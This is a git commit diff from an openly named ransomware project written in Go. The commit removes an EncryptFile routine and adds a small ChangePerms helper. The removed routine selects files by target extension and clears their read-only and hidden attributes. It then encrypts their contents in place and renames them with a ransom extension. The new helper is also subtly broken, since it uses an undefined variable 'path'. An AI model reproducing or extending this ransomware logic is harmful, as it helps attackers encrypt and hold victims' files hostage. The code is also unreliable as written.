0cbd5b5d7f63731f8e26772383841eb8075c05b1
PaulDotSH <paulandreiabrudan@pm.me>
2022-04-29 22:09:13 +0300

    remove hidden and readonly from files

--- ransomware/ransom/encryption_windows.go
+++ ransomware/ransom/encryption_windows.go
@@ -3,62 +3,13 @@
 
 package ransom
 
-import "os"
+import (
+	"syscall"
+)
 
-func EncryptFile(path string, key []byte) error {
-	if strings.HasSuffix(path, extension) {
-		return nil
-	}
+func ChangePerms(file string) error {
+	filenameW, err := syscall.UTF16PtrFromString(path)
+	syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_NORMAL)
 
-	//This should be a compile time constant so code should get optimized by the compiler
-	//Check if the current's file extension is in the dict or list
-	if UseDict {
-		if extensionDict[GetFileExtensionFastest(path)] != 1 {
-			return nil
-		}
-	} else {
-		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
-		ok := 0
-		for i := 0; i < Len; i++ {
-			if extensionsSlice[i] == Extension {
-				ok = 1
-			}
-		}
-		if ok == 0 {
-			return nil
-		}
-	}
-
-	data, err := ioutil.ReadFile(path)
-	if err != nil {
-		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
-
-		//remove hidden from file
-		filenameW, err = syscall.UTF16PtrFromString(path)
-		a, _ := syscall.GetFileAttributes(filenameW)
-		syscall.SetFileAttributes(filenameW, a&^syscall.FILE_ATTRIBUTE_READONLY)
-
-		//remove read-only from file, chmod with 0200 removes read-only from the file but not hidden
-		os.Chmod(path, 0200)
-
-		data, err = ioutil.ReadFile(path)
-		if err != nil {
-			fmt.Println(err)
-			return nil
-		}
-	}
-
-	data = Encrypt(key, data)
-	err = ioutil.WriteFile(path, data, 0644)
-	if err != nil {
-		fmt.Println(err)
-		return nil
-	}
-
-	var sb strings.Builder
-	sb.WriteString(path)
-	sb.WriteString(extension)
-	err = os.Rename(path, sb.String())
-	fmt.Println(err)
-	return nil
+	return err
 }
